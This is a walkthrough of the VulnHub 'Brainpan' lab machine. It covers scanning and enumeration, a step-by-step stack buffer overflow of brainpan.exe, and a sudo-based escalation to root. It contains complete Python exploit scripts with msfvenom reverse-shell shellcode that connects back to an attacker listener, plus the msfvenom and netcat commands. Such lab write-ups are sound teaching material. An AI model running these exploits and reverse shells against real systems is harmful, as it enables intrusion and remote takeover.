Download brainpan from [vulnhub](https://www.vulnhub.com/entry/brainpan-1,51/) and provision it as a VM.

PS. This walkthroug is more focused on buffer overflow part.

# Scanning

Let’s try to find the IP of this machine using nmap. 

`nmap  -sn  192.168.69.100/24` 

Below, we can see that the IP address is discovered to be 192.168.69.104.

![4968c3349c6dcf24a34492aee42e58b6.png](/_resources/3c106cdeb28b4fa9a5eeae7ad1812a1e.png)

Let’s perform an nmap scan on this machine. 

`nmap -T4 -p- -A 192.168.69.104` 

Below are the results of the nmap scan, where port 9999 and http running on 10000 were detected.

![b0d695ca1a44d3cc7684c80e0d372ccb.png](/_resources/1b5e8edd1dda45bab01654d047dc24cf.png)


# Enumeration

Port 10000 is serving an https server. Opening it in browser gives us the following unintersting page.

![754f09cefc635037a1d869aeefd66d64.png](/_resources/29639ff557cc4f18be68de3b148b43d6.png)

Looking for low hanging fruits at robots.txt. Unfortunately there isn't one here but its a good practise to always look at robots.txt as in the simplest cases, it (robots.txt) will reveal restricted paths and the technology used by servers/web-apps.

![e42f43d689380dbea40187baf2b5fad1.png](/_resources/e8381a398e0d4bd78bce65853585e3bb.png)

 I started directory busting using dir. 

`dirb http://192.168.69.104:10000 /usr/share/wordlists/dirb/common.txt` 

![58ca4947419b2f61cb7e15c9665fbfbd.png](/_resources/2c0308b8e5c04e808f6d579e71b9d877.png)

... and found a bin directory in which we can see that an .exe named brainpan is present.

![2395216d2d9b89b471d5af43434c968d.png](/_resources/0906b9809a194cf5850afeb66fcb9886.png)

Since it is an .exe file, I need to evaluate the file in my Windows 7 lab machine. But first lets confirm its file type. *Spoiler: It is a windows executable file.*

`file Downloads/brainpan.exe`

![888c3ff6f19a66eb2b356770412bc5ad.png](/_resources/4ce3497d273f4680a431b054427a23ab.png)

Using string command to extract strings of printable characters from this file. We can see a rather interesting set of characters. *Spoiler: It is the password for authenticating ...*

`strings Downloads/brainpan.exe` 

![1032d53b3c183822323b7d017e67945c.png](/_resources/c57c388a02cb4bc9b2f450418b2eaa79.png)

Dropping brainpan.exe to the Windows 7 lab machine. Below we can see that brainpan.exe is running and waiting for connection on port 9999. It is the same file running on target machine, which can be confirmed by connecting to target machine (brainpan).

![c5fb599587e7d4c1d6cc5adf3a3d9806.png](/_resources/935a5f2062684f8a92640efb4ec856ff.png)

Connecting to Windows 7 machine using net-cat, running brainpan.exe.
`nc -nv 192.168.69.101 9999`

![a5bccb2981932f2a47246bb458efc670.png](/_resources/170cd19b33a24a64bf9a5742d6533ac4.png)

![219febe29ab591a55eeba5ff12f828dc.png](/_resources/9b34d434766b4f22b3185f8d83cbb1b7.png)

![2a1f38a35c15d6733129f154951edd8b.png](/_resources/935db545c12d4b98b809d268d3ffbe84.png)

![00fd1b9a9a6c6458f76750f251c3cdbd.png](/_resources/f8de05508bf94098bb85d62404993f00.png)

![c40ebc3b35c9978e4df95f916a2474ca.png](/_resources/2238882e0d404b428b81b2211a3d9fed.png)


# Debugging (that Buffer Overflow part)

**Step 1. Fuzzing**

Suspecting the brainpan.exe application is vulnerable to a buffer overflow attack a simple Python fuzzer can be written to test this. 
```
#!/usr/bin/python
import sys,socket 
address = '192.168.69.101'
port = 9999
buffer = ['\x41']
counter = 100
while len(buffer)<= 10:
	buffer.append('\x41'*counter)
	counter=counter+100
try:
	for string in buffer:	
		print '[+] Sending %s bytes...' % len(string)
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connect=s.connect((address,port))
		s.recv(1024)
		s.send(string + '\r\n')
		print '[+] Done'
except:
 	print '[!] Unable to connect to the application. You may have crashed it.'
 	sys.exit(0)
finally:
	s.close()
``` 

The script above creates a string of 100 A characters in the variable buffer, tries to connect to the Windows host on port 9999 and sends the buffer. When done it increments the buffer with 100 A’s and then tries to connect and send the string, which is now 200 A’s again.
The fuzzer will keep increasing the buffer of A’s each time it runs until it can no longer connect to port 9999 which is an indication the application crashed and is no longer accepting connections. The script can be downloaded here.
Running the fuzzer with Python reveals it can no longer connect and shows the crash message when it sends around 600 bytes to the application. 

![b1b97431555eded815d0dcfc8d6b0449.png](/_resources/1421b26ac2044f0d96b9897afbf9e4b4.png)

On the Windows command prompt the buffer of A’s is displayed on the screen, followed by the bytes copied message. It is clearly visible that after this action the application exited to the command prompt and is no longer running. 

![de5f4c8f2a83d273b2657c3d6ace40e4.png](/_resources/b565345eab984584ba05e665d5ade53a.png)

**Step 2. Replicating the Crash**

We know from fuzzing the brainpan.exe application in previous step that it crashes when around 700 bytes are sent. We will replicate this crash while the brainpan.exe application is attached to the debugger to verify what happens. 

```
#!/usr/bin/python
import socket
import sys
from time import sleep

buffer = 'A' * 700		#change 700 accordingly

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('192.168.69.101',9999))
  s.recv(1024)

  print '[*] Sending buffer.'
  s.send(buffer + '\r\n')
  s.close()

except:
  print '[*] Could not connect to target, exiting.'
  sys.exit()
```

The script above is a modified version of the fuzzing script and will be used and edited in the remaining steps to develop a working exploit. A variable buffer is created which contains a string of 700 A’s. The script then connects to the application on port 9999 and sends the buffer of 700 A’s. 

![436a0ad33050356f03454c2b3adaa001.png](/_resources/e8d7579d8bb945e0b402fc52e3bfb231.png)

Returning to the debugger the status bar on the bottom of the screen shows an access violation. In the top right window, we see the EDX and ESP register filled with A’s and the EIP register which displays the value 41414141 which is the hexadecimal representation of the letter A stored in the buffer variable. Looking at the stack window in the bottom right of the screen we see that memory address 005FF910 which is ESP is filled with A’s as well. 

![161e1bc8d5c8e053dd03774585c51f9a.png](/_resources/8000a9f69d84486bae08e0c00cfbd243.png)

Reattach the brainpan.exe application to the debugger by navigating to File > Open and clicking Play like we did in the Debugging: Setting Up the Debugging Environment step. Before continuing make sure the application is in a running state.

**Step 3. Finding the Offset to the EIP Register**

To control the execution flow of the application it is important to control the EIP register. To gain control of this register the exact offset to EIP has to be found so we can fill it with whatever data we want. The ruby script pattern_create.rb can be leveraged to create a unique string of characters to determine the exact offset to the EIP register.
To do this we copy the crash.py script and modify it with the output of pattern_create.rb. We make the string which will be the new buffer 700 bytes long.
 
`msf-pattern_create -l 700`

![f3a50c8d00511a9aa5ca4c34c3372542.png](/_resources/31a6c14957a24ec49549f803a934012b.png)

Modifying the script pattern.py we add a variable called pattern and fill it with the string created by pattern_create.rb. Furthermore we modify the buffer variable to include the pattern variable we just added.

```
import socket
import sys
from time import sleep

pattern = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A'

buffer = pattern

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('192.168.69.101',9999))
  s.recv(1024)

  print '[*] Sending buffer.'
  s.send(buffer + '\r\n')
  s.close()

except:
  print '[*] Could not connect to target, exiting.'
  sys.exit()

```

Running the script.

![10f68236d57b16116f84f24352aaf281.png](/_resources/a01f2edca42b4ba1a6cbde658172928b.png)

The debugger again shows an access violation in the status bar at the bottom of the screen and is in a paused state. This time the EIP register is filled with a unique value instead of just A’s. The value in EIP is "35724134" and should be noted for later use. 

![749454d2d150299fece5e3970b517604.png](/_resources/e1207e0ef7974da19a07b401ef4ca4f2.png)

The companion ruby script pattern_offset.rb can be leveraged to find the exact offset to the EIP register by combining it with the unique value from EIP we noted earlier. Running the script with the -l 650 and -q 35724134 parameters shows an exact offset of 524 bytes. 

`msf-pattern_offset -l 3000 -q 35724134`

![b80b421e33d2728f915b67de7f2a8ae7.png](/_resources/8d9472f8fc0e4a46bae5f668390f8255.png)

Make sure to reattach the brainpan.exe application to the debugger.

**Step 4. Controlling the EIP Register**

To make sure we have the correct offset to the EIP register we will modify the script and try to put four B’s in the EIP register. If the offset of 524 is correct running the modified script 4-control-eip.py should display the four B’s in the EIP register instead of the A’s or the unique string from the previous steps. For good measure and clarity, we will pad the buffer variable with some C characters to clearly demonstrate how the buffer variable from our script is represented in memory within Immunity Debugger.
The buffer variable is modified to include 524 A’s then 4 B’s and 122 C’s. 524 + 4 + 172 = 700 keeping our buffer length the same as before.

```
import socket
import sys
from time import sleep

buffer = 'A' * 524 + 'B' * 4  + 'C' * 172 # 524 + 4 + 172 = 700

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('192.168.69.101',9999))
  s.recv(1024)

  print '[*] Sending buffer.'
  s.send(buffer + '\r\n')
  s.close()

except:
  print '[*] Could not connect to target, exiting.'
  sys.exit()

```

Running the script.

![ed4fe3aca81eff5df184df5057350aca.png](/_resources/3d522110e92043a181014fa9addaad65.png)

As expected the application crashes and Immunity Debugger shows an access violation in the status bar at the bottom of the screen. Note however how the EDX register is now filled with A’s while the ESP register is filled with C’s. Also note the EIP register which is filled with 42424242 which represent our four B’s in hexadecimal format. The stack window in the bottom right clearly displays how our A’s are cleanly followed by four B’s and nicely continues with C’s as expected. 

![c0b3f050c2f7b641ebf0a2c2dbcf3b2a.png](/_resources/d6791370244b48828884310a10256357.png)

Following the memory dump by right clicking on the ESP register and then clicking Follow in Dump in the context menu shows how the memory is built up and clearly indicates a clean transition from A’s to the four B’s and continuing with C’s. This clearly shows how the buffer variable from our script is represented in memory within Immunity Debugger. 

![0719bd3efdaf4fe1a81bb9294907bed4.png](/_resources/9d5984c85d31463c8931225d68cb5077.png)

![546d250a9fff0cd39dd985a76842d9da.png](/_resources/fabbd32242884decbcc4b22b62fa151b.png)

Make sure to reattach the brainpan.exe application to the debugger .

**Step 5. Finding Space for Shellcode**

Now that we have confirmed control over the EIP register, can fill it with data of our choosing and know how our buffer variable is built up in memory we need to find space for our shellcode. A Windows payload is usually about 350 to 450 bytes while our C’s currently only represent 172 bytes in our buffer variable, to small of a space for 450 bytes of shellcode. The simplest way to find space is to just increase the amount of C’s in our buffer variable and test if the application still behaves the same as before.

To do this we modify the script and increase the C’s in the buffer variable by 400 creating a total of 572 C’s. Plenty of space for a Windows reverse shell payload and some extra padding. 

```
import socket
import sys
from time import sleep

# buffer = 'A' * 524 + 'B' * 4  + 'C' * 172 # 524 + 4 + 122 = 700
buffer = 'A' * 524 + 'B' * 4  + 'C' * 572 # 172 + 400 = 572

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('192.168.69.101',9999))
  s.recv(1024)

  print '[*] Sending buffer.'
  s.send(buffer + '\r\n')
  s.close()

except:
  print '[*] Could not connect to target, exiting.'
  sys.exit()

```

Running the script.

![3db49e61de4388bbd8f47a01e3cabb56.png](/_resources/0e8dae34f97b428498a863144434b387.png)

As expected the debugger again shows an access violation. Following the memory dump by right clicking on the ESP register and then clicking Follow in Dump in the context menu again shows how the buffer is built up in memory. It is clear we now have more C’s than before and successfully increased the space needed to store our shellcode. 

![716e357d12696afb680a3c540ed6f515.png](/_resources/547dee72ea5d47a9a515cf0209f24d96.png)

Make sure to reattach the brainpan.exe application to the debugger.

**Step 6. Finding Bad Characters**

Some hexadecimal characters cannot be used in shellcode because they interfere with executing the shellcode correctly. An example of a character that is always bad is \x00 also known as a NULL character or NULL byte. This character signifies the end of a string thus cutting off the string stored in our buffer variable and cutting off the shellcode before it can fully execute.

Other bad characters depend on the application and should be found before shellcode can be generated. We know from the previous steps how the buffer variable is represented in memory as the follow in dump function clearly shows this. We can use this technique to find bad characters that should be excluded from our shellcode.

To find bad characters the 5-find-space.py script is modified with a variable badchars that includes all characters in hexadecimal format apart from the \x00 character. The buffer variable is modified to include the badchars variable instead of the C’s from the previous step.

```
import socket
import sys
from time import sleep

badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )


buffer = 'A' * 524 + 'B' * 4  + badchars

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('192.168.69.101',9999))
  s.recv(1024)

  print '[*] Sending buffer.'
  s.send(buffer + '\r\n')
  s.close()

except:
  print '[*] Could not connect to target, exiting.'
  sys.exit()

```

Running the script in python.

![9575aa90096c102544fa269ba9f8a278.png](/_resources/7d5b37f656354eb9aeedcd88412edb74.png)

Looking at the debugger we are greeted by the access violation again. To find bad characters we again have to leverage the follow in dump function for the ESP register and look for signs of our buffer variable being truncated anywhere. The screenshot below shows all hex characters from \x01 all the way through \xFF in memory without any truncation meaning the brainpan.exe application does not have any more bad characters. 

![e32a2fb892853121e0c7b0b55fdc8451.png](/_resources/7da7d4f3d71941c383c8b68c8408059e.png)

If the string looks truncated or garbled in memory the bad character should be removed from the badchars variable in the 6-find-bad-characters.py script. When removed the script should be run again until no other bad characters are found truncating the output of the buffer variable.

Make sure to reattach the brainpan.exe application to the debugger.

**Step 7. Jumping to the ESP Register**

As should be evident by now the ESP register is consistently filled with the data we want whether it be our buffer of A’s, C’s or the bad characters from the previous step and can conveniently store our shellcode. If we want to execute the shellcode stored in the ESP register we should find a way to redirect the execution flow of the brainpan.exe application to jump to that location in memory. This is where control of the EIP register comes into play.

To jump to ESP we should find a memory location that contains a JMP ESP instruction either within the brainpan.exe application itself or one of its loaded modules. The hexadecimal equivalent of a JMP ESP instruction is \xFF\xE4. Now we need to find a module that has no memory protections such as SafeSEH or ASLR enabled. This can be achieved with the mona.py script.

In the command window at the bottom of Immunity Debugger type !mona modules.

![69b1d813b8ff5981a9ee48b6ebd46432.png](/_resources/3c07560b32db41c197e3fa534a15a660.png)

A screen like the one below appears with all the loaded modules, their memory address and memory protections. We are looking for a module that has false across the board. False means the protection is not enabled. The only module that satisfies these criteria is the brainpan.exe application itself. 

![d8c4ab35c1b7f908f7fa8440229edef9.png](/_resources/ea9cbb0d53974ffd89b72d128850aa7f.png)

Now that we have identified a module without memory protections enabled we can leverage mona.py again to look for a memory location with a JMP ESP instruction. This can be achieved with the command !mona find -s “\xff\xe4” -m brainpan.exe. Fortunately, Mona finds a JMP ESP instruction at memory address 311712F3. 

`!mona find -s “\xff\xe4” -m brainpan.exe`

![439c5fa2c11b198cf078204ec2af4f2f.png](/_resources/160981cbe1a041a3ae17d45a9885aa1a.png)

To verify if the memory address 311712F3 indeed contains a JMP ESP instruction we can search for the memory address within Immunity Debugger by clicking on the search button at the top of the screen, entering the memory address 311712F3 and then clicking OK. The debugger jumps to the address and we can see that it indeed contains a JMP ESP instruction. 

![f1427b37b377ad00df34cb178609b89c.png](/_resources/b3be605b9004495d81c59c78141c2686.png)

To verify if we can indeed jump to ESP using this memory address the 6-find-bad-characters.py script is modified to include the memory address with the JMP ESP instruction we discovered. The buffer variable is modified with the memory address that contains the JMP ESP instruction instead of our four B’s we also add back the 522 C’s at the end of the buffer variable instead of the bad characters from the previous step. 

```
import socket
import sys
from time import sleep

badchars = ()

buffer = 'A' * 524 + '\xF3\x12\x17\x31'  + 'C' * 572		# JMP ESP noted in little endian
# 311712F3 is in reverse order (memory)

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('192.168.69.101',9999))
  s.recv(1024)

  print '[*] Sending buffer.'
  s.send(buffer + '\r\n')
  s.close()

except:
  print '[*] Could not connect to target, exiting.'
  sys.exit()

```

Enter the memory address in reverse. In other words, the memory address 31 17 12 F3 should be noted in hexadecimal format as follows \xF3 \x12 \x17 \x31 within our buffer variable. The modified script can be downloaded here.

Before we run the script we will set a breakpoint on the memory address that contains the JMP ESP instruction within Immunity Debugger. We do this to instruct the debugger to pause before executing instructions beyond that point. This is so we can follow exactly what happens. In Immunity Debugger click on the memory address with the JMP ESP instruction and press the F2 button to set a breakpoint. 

![7159c7145d255dcc555ce388dad6bb4a.png](/_resources/a7e0c9102e2e468c96070797b1335ca1.png)

Once the breakpoint is reached Immunity Debugger enters a paused state, the status bar indicates a breakpoint is reached at address 311712F3 that contains the JMP ESP instruction. If the application executes further we should expect it to jump to the beginning of the ESP register that contains our C characters from our buffer variable. 

**Step 8. Writing the Exploit**

Now that we control the EIP register, found a memory location with a JMP ESP instruction and confirmed the JMP ESP instruction works as expected and brings us to the beginning of our C’s in the buffer variable it is time to finish the exploit by generating and adding some shellcode instead of the innocent C’s we have been using as padding until now.

Msfvenom can be leveraged to generate a Windows reverse shell shellcode that connects back to a listener on our attacking machine. Make sure to exclude any bad characters that where found in Step 6 with the -b option. The generated shellcode is 351 bytes long which neatly fits in the 572 C’s we have added to our buffer variable. 

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.43.8 LPORT=4444 EXITFUNC=thread -a x86 --platform windows -b "\x00" -f c > shellcode.txt`

Now that the shellcode is generated it should be copied so that it can be pasted in the exploit script. 

![e78148542d4f2ef2f12ab928e81a5497.png](/_resources/7eaf0dad34b84e4f81883a7c5e14a947.png)

To add the shellcode and finish the exploit the script should be modified with a shellcode variable that contains the shellcode generated by Msfvenom. 

```
import socket
import sys
from time import sleep

shellcode = ("\xdb\xca\xba\x39\xcc\xf8\x8e\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x52\x83\xe8\xfc\x31\x50\x13\x03\x69\xdf\x1a\x7b\x75\x37\x58"
"\x84\x85\xc8\x3d\x0c\x60\xf9\x7d\x6a\xe1\xaa\x4d\xf8\xa7\x46"
"\x25\xac\x53\xdc\x4b\x79\x54\x55\xe1\x5f\x5b\x66\x5a\xa3\xfa"
"\xe4\xa1\xf0\xdc\xd5\x69\x05\x1d\x11\x97\xe4\x4f\xca\xd3\x5b"
"\x7f\x7f\xa9\x67\xf4\x33\x3f\xe0\xe9\x84\x3e\xc1\xbc\x9f\x18"
"\xc1\x3f\x73\x11\x48\x27\x90\x1c\x02\xdc\x62\xea\x95\x34\xbb"
"\x13\x39\x79\x73\xe6\x43\xbe\xb4\x19\x36\xb6\xc6\xa4\x41\x0d"
"\xb4\x72\xc7\x95\x1e\xf0\x7f\x71\x9e\xd5\xe6\xf2\xac\x92\x6d"
"\x5c\xb1\x25\xa1\xd7\xcd\xae\x44\x37\x44\xf4\x62\x93\x0c\xae"
"\x0b\x82\xe8\x01\x33\xd4\x52\xfd\x91\x9f\x7f\xea\xab\xc2\x17"
"\xdf\x81\xfc\xe7\x77\x91\x8f\xd5\xd8\x09\x07\x56\x90\x97\xd0"
"\x99\x8b\x60\x4e\x64\x34\x91\x47\xa3\x60\xc1\xff\x02\x09\x8a"
"\xff\xab\xdc\x1d\xaf\x03\x8f\xdd\x1f\xe4\x7f\xb6\x75\xeb\xa0"
"\xa6\x76\x21\xc9\x4d\x8d\xa2\x36\x39\xa6\x3a\xdf\x38\xb8\x2b"
"\x43\xb4\x5e\x21\x6b\x90\xc9\xde\x12\xb9\x81\x7f\xda\x17\xec"
"\x40\x50\x94\x11\x0e\x91\xd1\x01\xe7\x51\xac\x7b\xae\x6e\x1a"
"\x13\x2c\xfc\xc1\xe3\x3b\x1d\x5e\xb4\x6c\xd3\x97\x50\x81\x4a"
"\x0e\x46\x58\x0a\x69\xc2\x87\xef\x74\xcb\x4a\x4b\x53\xdb\x92"
"\x54\xdf\x8f\x4a\x03\x89\x79\x2d\xfd\x7b\xd3\xe7\x52\xd2\xb3"
"\x7e\x99\xe5\xc5\x7e\xf4\x93\x29\xce\xa1\xe5\x56\xff\x25\xe2"
"\x2f\x1d\xd6\x0d\xfa\xa5\xf6\xef\x2e\xd0\x9e\xa9\xbb\x59\xc3"
"\x49\x16\x9d\xfa\xc9\x92\x5e\xf9\xd2\xd7\x5b\x45\x55\x04\x16"
"\xd6\x30\x2a\x85\xd7\x10")


buffer = 'A' * 524 + '\xF3\x12\x17\x31' + '\x90' * 32 + shellcode + 'C' * 189 
# 32 NO OPS are added as \x90
# c = 522-32-351

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('192.168.43.30',9999))
  s.recv(1024)

  print '[*] Sending buffer.'
  s.send(buffer + '\r\n')
  s.close()

except:
  print '[*] Could not connect to target, exiting.'
  sys.exit()
```

The buffer variable is modified to contain 32 NOP’s and the new shellcode variable, the NOP’s are added to give the shellcode some room to expand if needed. The 32 bytes of NOP’s and the 351 bytes that contain she shellcode should be subtracted from the 572 C’s in the buffer variable to keep the total size of the buffer the same as it has been until now. 522 - 32 - 351 = 189 so we should pad the buffer with another 189 C’s after we added in the NOP’s and the shellcode variable. 

The exploit is now finished and ready for testing. Before executing the exploit an Ncat listener is prepared to catch the reverse shell connection. 

`nc -nvlp 4444 `

Running the exploit script.

![0f58501e84e846ccacdeab170936be3a.png](/_resources/718959f3899b4c9d8bc675cea4176f18.png)

The shellcode in the exploit executes and connects back to the Ncat listener.

![76d51de3a8fa8e7c73dce591080d6f1b.png](/_resources/5ae1e1fd3dfb4d14aa6dfb92d726ff67.png)


# Exploitation

Running the exploit at brainpan box and getting a shell.

![dc33a2f0d68cc25e081d21556cb2399a.png](/_resources/09af96eafc594d6aa2169e0bea04ceef.png)

We are running windows commands on this shell. But the directories indicate that it is a Linux machine *surprise surprise* 
brainpan.exe is running on linux using Wine.

![0e2f8a0148c60a1203577a49582dfed1.png](/_resources/51c10bfb406241cdaa4a5281bef5e037.png)

![d5b6253dfc6ea786863b06251658ced5.png](/_resources/25a1c00532704eb2a6a754657cfb12af.png)

![09b437c10c086978334071dbf4f8d5eb.png](/_resources/a5b7b10117c6464e80268ba8e9c59cbd.png)

Let's just create a payload for Linux to get the reverse shell back. Below, we use msfvenom to generate the Linux reverse shell. 

`msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.43.8 LPORT=4444 EXITFUNC=thread -a x86 --platform linux -b "\x00" -f c > shellcode.txt`

Using the generated shellcode to get a reverse shell from brainpan machine using brainpan_exploit.py
```
import socket
import sys
from time import sleep

shellcode = ("\xda\xc4\xd9\x74\x24\xf4\xbd\x17\x07\x75\xb4\x58\x31\xc9\xb1"
"\x12\x31\x68\x17\x03\x68\x17\x83\xff\xfb\x97\x41\xce\xd8\xaf"
"\x49\x63\x9c\x1c\xe4\x81\xab\x42\x48\xe3\x66\x04\x3a\xb2\xc8"
"\x3a\xf0\xc4\x60\x3c\xf3\xac\xb2\x16\x28\x24\x5b\x65\x2f\x25"
"\xc7\xe0\xce\xf5\x91\xa2\x41\xa6\xee\x40\xeb\xa9\xdc\xc7\xb9"
"\x41\xb1\xe8\x4e\xf9\x25\xd8\x9f\x9b\xdc\xaf\x03\x09\x4c\x39"
"\x22\x1d\x79\xf4\x25")


buffer = 'A' * 524 + '\xF3\x12\x17\x31' + '\x90' * 32 + shellcode + 'C' * 139 
# 32 NO OPS are added as \x90
# c = 522-32-351

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('192.168.43.149',9999))
  s.recv(1024)

  print '[*] Sending buffer.'
  s.send(buffer + '\r\n')
  s.close()

except:
  print '[*] Could not connect to target, exiting.'
  sys.exit()

```

![c5be47dee56750a8921cd4959d122573.png](/_resources/7213ce04b25d41fbbd7eb458c5a4d143.png)

To spawn a better shell: `python3 -c 'import pty; pty.spawn("/bin/sh")'`

## Privilege Escalation

The shell is currently under user puck.

One of the first commands that I execute is `sudo -l`. (Another useful check I perform is to check for binaries with SUID bit set).
Below is the output from the sudo -l command. We can see that the user puck can run the binary under /home/anansi/bin/anansi_util as root.

![c7fce6d7a73c22038e65aa1dd4a014aa.png](/_resources/7720165e5bf94f3a99e4df3a9064191d.png)

Below, we have run the abovementioned anansi_util and it has some parameters. An interesting parameter is manual [command]. We just passed a sample command “/bin/bash" to it and then type !/bin/bash, and we have escalated to root.

![3c702b75b300938489518848a53daba3.png](/_resources/f50316ff673d44c39ba830047e5ac1cf.png)
